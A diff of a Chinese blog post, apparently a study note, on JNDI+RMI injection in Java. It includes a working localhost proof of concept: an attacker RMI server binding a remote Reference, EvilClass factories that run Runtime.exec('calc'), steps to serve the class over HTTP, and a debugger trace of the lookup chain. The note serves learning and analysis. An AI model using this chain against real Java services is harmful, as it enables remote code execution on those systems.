@@ -20,20 +20,33 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="# JNDI+RMI  # 什么是JNDI  - JNDI 提供统一的客户端 API，通过不同的JNDI服务供应接口（SPI）的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。 - 若程序定义了JNDI中的接口，则可以通过该接口的API访问系统的命令服务和目录服务。  ![image](&#x2F;yuque-notes">
+  <meta name="description" content="什么是JNDI - JNDI 提供统一的客户端 API，通过不同的JNDI服务供应接口（SPI）的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。 - 若程序定义了JNDI中的接口，则可以通过该接口的API访问系统…">
 <meta property="og:type" content="article">
 <meta property="og:title" content="JNDI+RMI">
 <meta property="og:url" content="http://example.com/2026/09/16/14-JNDI+RMI/index.html">
 <meta property="og:site_name" content="Glut4micum">
-<meta property="og:description" content="# JNDI+RMI  # 什么是JNDI  - JNDI 提供统一的客户端 API，通过不同的JNDI服务供应接口（SPI）的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。 - 若程序定义了JNDI中的接口，则可以通过该接口的API访问系统的命令服务和目录服务。  ![image](&#x2F;yuque-notes">
+<meta property="og:description" content="什么是JNDI - JNDI 提供统一的客户端 API，通过不同的JNDI服务供应接口（SPI）的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。 - 若程序定义了JNDI中的接口，则可以通过该接口的API访问系统…">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/e9cc694b-asynccode.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/193cba5c-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/49a9f163-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/d2f8cfd4--1428049740.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/b3bc8d11-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/518c0f4f-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/0a58bc86-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/c4a92d6f-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/e22267e0-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/45a300f2-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/74026dfc-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/1abeeacd-image.png">
 <meta property="article:published_time" content="2026-09-16T13:58:39.000Z">
 <meta property="article:modified_time" content="2026-09-16T13:58:39.000Z">
 <meta property="article:author" content="谷氨酸棒状杆菌">
-<meta property="article:tag" content="Web安全">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="JNDI">
+<meta property="article:tag" content="RMI">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/e9cc694b-asynccode.png">
 
 <link rel="canonical" href="http://example.com/2026/09/16/14-JNDI+RMI/">
 
@@ -235,6 +248,7 @@
               <span class="post-meta-item-text">阅读次数：</span>
               <span id="busuanzi_value_page_pv"></span>
             </span>
+            <div class="post-description">什么是JNDI - JNDI 提供统一的客户端 API，通过不同的JNDI服务供应接口（SPI）的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。 - 若程序定义了JNDI中的接口，则可以通过该接口的API访问系统…</div>
 
         </div>
       </header>
@@ -245,153 +259,88 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
-# JNDI+RMI
-
-# 什么是JNDI
-
-- JNDI 提供统一的客户端 API，通过不同的JNDI服务供应接口（SPI）的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。
-- 若程序定义了JNDI中的接口，则可以通过该接口的API访问系统的命令服务和目录服务。
-
-![image](/yuque-notes/02-Knowledge Book/assets/e9cc694b-asynccode.png)
-
-# JNDI解决的问题/特性
-
-没有之前需要将具体的外部依赖，例如数据库的地址参数写入到Java代码中，程序才能找到具体的数据库地址进行链接。当配置信息变动，就又需要手动去调节。有了JNDI之后，可以不用去管这些配置信息，全都交给J2EE容器来配置和管理，程序员只需要对这些配置和管理进行引用即可。其实就是可以给资源取一个名字，再根据这个名字去找这个资源。
-
-# JNDI+RMI注入原理分析
-
-在`Java JDK`里面提供了5个包给`JNDI`的功能实现
-
+        <h1 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h1><h1 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI"></a>什么是JNDI</h1><ul>
+<li>JNDI 提供统一的客户端 API，通过不同的JNDI服务供应接口（SPI）的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。</li>
+<li>若程序定义了JNDI中的接口，则可以通过该接口的API访问系统的命令服务和目录服务。</li>
+</ul>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/e9cc694b-asynccode.png" alt="image"></p>
+<h1 id="JNDI解决的问题-特性"><a href="#JNDI解决的问题-特性" class="headerlink" title="JNDI解决的问题&#x2F;特性"></a>JNDI解决的问题&#x2F;特性</h1><p>没有之前需要将具体的外部依赖，例如数据库的地址参数写入到Java代码中，程序才能找到具体的数据库地址进行链接。当配置信息变动，就又需要手动去调节。有了JNDI之后，可以不用去管这些配置信息，全都交给J2EE容器来配置和管理，程序员只需要对这些配置和管理进行引用即可。其实就是可以给资源取一个名字，再根据这个名字去找这个资源。</p>
+<h1 id="JNDI-RMI注入原理分析"><a href="#JNDI-RMI注入原理分析" class="headerlink" title="JNDI+RMI注入原理分析"></a>JNDI+RMI注入原理分析</h1><p>在<code>Java JDK</code>里面提供了5个包给<code>JNDI</code>的功能实现</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javax.naming：主要用于命名操作,包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。</span><br><span class="line">javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；</span><br><span class="line">javax.naming.event：在命名目录服务器中请求事件通知；</span><br><span class="line">javax.naming.ldap：提供LDAP支持；</span><br><span class="line">javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构建一个初始上下文。</span></span><br><span class="line">InitialContext() </span><br><span class="line"><span class="comment">//构造一个初始上下文，并选择不初始化它。</span></span><br><span class="line">InitialContext(<span class="type">boolean</span> lazy) </span><br><span class="line"><span class="comment">//使用提供的环境构建初始上下文。</span></span><br><span class="line">InitialContext(Hashtable&lt;?,?&gt; environment) </span><br></pre></td></tr></table></figure>
 
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为类名为“className”的对象构造一个新的引用。</span></span><br><span class="line">Reference(String className) </span><br><span class="line"><span class="comment">//为类名为“className”的对象和地址构造一个新引用。 </span></span><br><span class="line">Reference(String className, RefAddr addr) </span><br><span class="line"><span class="comment">//为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 </span></span><br><span class="line">Reference(String className, RefAddr addr, String factory, String factoryLocation) </span><br><span class="line"><span class="comment">//为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span></span><br><span class="line">Reference(String className, String factory, String factoryLocation)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">参数：</span></span><br><span class="line"><span class="comment">className 远程加载时所使用的类名</span></span><br><span class="line"><span class="comment">factory  加载的class中需要实例化类的名称</span></span><br><span class="line"><span class="comment">factoryLocation  提供classes数据的地址可以是file/ftp/http协议</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span>;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);<span class="comment">//test为恶意接口的名字</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-JNDI注入：当开发者在定义`JNDI`接口初始化时，lookup()方法的参数被外部攻击者可控，攻击者可以将恶意url传入参数，以此劫持被攻击的Java客户端的JNDI请求指向恶意的服务器地址，恶意的资源服务器地址响应了一个恶意Java对象载荷（reference实例 or 序列化实例），对象在被解析实例化，实例化的过程造成了注入攻击。不同的注入方法区别主要就在于利用实例化注入的方式不同。
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/193cba5c-image.png)
-
-可以看到远程对象是通过rmi原生的lookup获取到的，而rmi是通过反序列化获取到的远程对象，这时如果客户端系统里有gadget组件，这一步的反序列化就能导致代码执行了。
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/49a9f163-image.png)
-
-这一行代码是在jdk8u121开启的，并且是加在RegistryContext里面的，也就是只对了jndi的rmi实现作了限制，新增加了一个if判断，如果com.sun.jndi.rmi.object.trustURLCodebase为true就可以通过codebase加载，因此这个漏洞想要直接利用是有版本限制的，`JDK 6u132`、`7u122`、`8u113`之前可以，高版本也有绕过方法，如利用 LDAP 返回序列化数据，触发本地 Gadget，或者利用本地恶意 Class 作为 Reference Factory，这篇文章不做详细的记录，之后有空再另起一篇。
-
-`Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;`
-
-这段代码判断传入的对象，是否满足RemoteReference接口，如果有则getReference()获取reference对象，然后进入getObjectInstance函数。
-
-具体利用流程如下：
-
-1、目标代码中调用了InitialContext.lookup(URI)，URI为用户可控的；
-
-2、攻击者设置uri为恶意rmi服务地址；
-
-3、攻击者设置rmi server向目标返回一个reference引用对象，reference对象中指定了一个精心构造的Factory类；
-
-4、目标进行lookup操作远程对象时，获取到动态加载并实例化了这个Factory类，接着调用factory.getObjectInstance()加载外部远程对象实例；
-
-![-1428049740.png](/yuque-notes/02-Knowledge Book/assets/d2f8cfd4--1428049740.png)
-
-## 漏洞成因
-
-lookup()参数可控
-
-漏洞代码示例
-
+<p>JNDI注入：当开发者在定义<code>JNDI</code>接口初始化时，lookup()方法的参数被外部攻击者可控，攻击者可以将恶意url传入参数，以此劫持被攻击的Java客户端的JNDI请求指向恶意的服务器地址，恶意的资源服务器地址响应了一个恶意Java对象载荷（reference实例 or 序列化实例），对象在被解析实例化，实例化的过程造成了注入攻击。不同的注入方法区别主要就在于利用实例化注入的方式不同。</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/193cba5c-image.png" alt="image.png"></p>
+<p>可以看到远程对象是通过rmi原生的lookup获取到的，而rmi是通过反序列化获取到的远程对象，这时如果客户端系统里有gadget组件，这一步的反序列化就能导致代码执行了。</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/49a9f163-image.png" alt="image.png"></p>
+<p>这一行代码是在jdk8u121开启的，并且是加在RegistryContext里面的，也就是只对了jndi的rmi实现作了限制，新增加了一个if判断，如果com.sun.jndi.rmi.object.trustURLCodebase为true就可以通过codebase加载，因此这个漏洞想要直接利用是有版本限制的，<code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code>之前可以，高版本也有绕过方法，如利用 LDAP 返回序列化数据，触发本地 Gadget，或者利用本地恶意 Class 作为 Reference Factory，这篇文章不做详细的记录，之后有空再另起一篇。</p>
+<p><code>Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;</code></p>
+<p>这段代码判断传入的对象，是否满足RemoteReference接口，如果有则getReference()获取reference对象，然后进入getObjectInstance函数。</p>
+<p>具体利用流程如下：</p>
+<p>1、目标代码中调用了InitialContext.lookup(URI)，URI为用户可控的；</p>
+<p>2、攻击者设置uri为恶意rmi服务地址；</p>
+<p>3、攻击者设置rmi server向目标返回一个reference引用对象，reference对象中指定了一个精心构造的Factory类；</p>
+<p>4、目标进行lookup操作远程对象时，获取到动态加载并实例化了这个Factory类，接着调用factory.getObjectInstance()加载外部远程对象实例；</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/d2f8cfd4--1428049740.png" alt="-1428049740.png"></p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>lookup()参数可控</p>
+<p>漏洞代码示例</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">public class RMIClient &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        InitialContext context = new InitialContext();</span><br><span class="line">        String url = &quot;rmi://127.0.0.1:1099/class&quot;;</span><br><span class="line">        context.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-`String uri = "rmi://127.0.0.1:1099/class"; ``initialContext.lookup(uri);` ∴会通过rmi协议访问127.0.0.7：1099/class
-
-攻击代码
-
+<p><code>String uri = &quot;rmi://127.0.0.1:1099/class&quot;; ``initialContext.lookup(uri);</code> ∴会通过rmi协议访问127.0.0.7：1099&#x2F;class</p>
+<p>攻击代码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class RMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        String url = &quot;http://127.0.0.1:1098/&quot;;</span><br><span class="line">        Reference reference = new Reference(&quot;EvilClass&quot;, &quot;EvilClass&quot;, url);</span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(&quot;class&quot;,referenceWrapper);//class要与客户机rmi同名</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello,static~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;constructor~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello,getObjectInstance~&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//没报错，并且执行了</span></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">public class EvilClass&#123;</span><br><span class="line"></span><br><span class="line">    // 静态代码块, 当类被加载时调用</span><br><span class="line">        public EvilClass() throws Exception&#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">//报错了，但是会执行</span><br></pre></td></tr></table></figure>
 
-搭建好了以后，我们先运行服务端，然后将EvilClass编译一下，再使用Python开启一个http服务
-
-`javac EvilClass.java`,`python -m http.server 1908`
-
-接着我们再运行客户端，就会发现已经成功执行代码了。
-
-## 漏洞代码触发链
-
-触发是由lookup，我们就打一个断点调试追踪看看
-
+<p>搭建好了以后，我们先运行服务端，然后将EvilClass编译一下，再使用Python开启一个http服务</p>
+<p><code>javac EvilClass.java</code>,<code>python -m http.server 1908</code></p>
+<p>接着我们再运行客户端，就会发现已经成功执行代码了。</p>
+<h2 id="漏洞代码触发链"><a href="#漏洞代码触发链" class="headerlink" title="漏洞代码触发链"></a>漏洞代码触发链</h2><p>触发是由lookup，我们就打一个断点调试追踪看看</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="type">ResolveResult</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.getRootURLContext(var1, <span class="built_in">this</span>.myEnv);</span><br><span class="line">    <span class="type">Context</span> <span class="variable">var3</span> <span class="operator">=</span> (Context)var2.getResolvedObj();</span><br><span class="line"></span><br><span class="line">    Object var4;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var4 = var3.lookup(var2.getRemainingName());</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        var3.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-![image.png](/yuque-notes/02-Knowledge Book/assets/b3bc8d11-image.png)
-
-首先我们可以看到var1就是我们lookup传入的url，然后我们追踪getRootURLContext方法，它用于解析rmi url并返回上下文信息，我们可以看到他返回的var2，已经把信息拆分了。
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/518c0f4f-image.png)
-
-`Context var3 = (Context)var2.getResolvedObj();`接着将var2的getResolvedObj属性赋给var3
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/0a58bc86-image.png)
-
-目的是为了接下来var3的lookup
-
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/b3bc8d11-image.png" alt="image.png"></p>
+<p>首先我们可以看到var1就是我们lookup传入的url，然后我们追踪getRootURLContext方法，它用于解析rmi url并返回上下文信息，我们可以看到他返回的var2，已经把信息拆分了。</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/518c0f4f-image.png" alt="image.png"></p>
+<p><code>Context var3 = (Context)var2.getResolvedObj();</code>接着将var2的getResolvedObj属性赋给var3</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/0a58bc86-image.png" alt="image.png"></p>
+<p>目的是为了接下来var3的lookup</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryContext</span>(<span class="built_in">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Remote var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = <span class="built_in">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NameNotFoundException</span>(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-这段代码的作用是查找给定名称的远程对象，并返回解码后的对象
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/c4a92d6f-image.png)
-
-var1是上文传入的RemainingName，也就是我们设置的class，首先会判断是否为空，接着从注册表中查找名称为var1的远程对象
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/e22267e0-image.png)我们去注册表那边看看是怎么个事儿。
-
+<p>这段代码的作用是查找给定名称的远程对象，并返回解码后的对象</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/c4a92d6f-image.png" alt="image.png"></p>
+<p>var1是上文传入的RemainingName，也就是我们设置的class，首先会判断是否为空，接着从注册表中查找名称为var1的远程对象</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/e22267e0-image.png" alt="image.png">我们去注册表那边看看是怎么个事儿。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> RemoteCall <span class="title function_">newCall</span><span class="params">(RemoteObject var1, Operation[] var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    clientRefLog.log(Log.BRIEF, <span class="string">&quot;get connection&quot;</span>);</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.ref.getChannel().newConnection();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clientRefLog.log(Log.VERBOSE, <span class="string">&quot;create call context&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (clientCallLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.logClientCall(var1, var2[var3]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">StreamRemoteCall</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(var6, <span class="built_in">this</span>.ref.getObjID(), var3, var4);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.marshalCustomCallData(var7.getOutputStream());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshaling custom call data&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var7;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var10) &#123;</span><br><span class="line">        <span class="built_in">this</span>.ref.getChannel().free(var6, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">throw</span> var10;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-`Connection var6 = this.ref.getChannel().newConnection();`在this.ref.getChannel().newConnection()中创建一个TCPConnection，接着构造一个StreamRemoteCall对象，并在其中远程初始化远程调用的头部信息，
-
-接着就到了调用var3的lookup方法
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/45a300f2-image.png)
-
-然后执行decodeObject，解码远程对象
-
+<p><code>Connection var6 = this.ref.getChannel().newConnection();</code>在this.ref.getChannel().newConnection()中创建一个TCPConnection，接着构造一个StreamRemoteCall对象，并在其中远程初始化远程调用的头部信息，</p>
+<p>接着就到了调用var3的lookup方法</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/45a300f2-image.png" alt="image.png"></p>
+<p>然后执行decodeObject，解码远程对象</p>
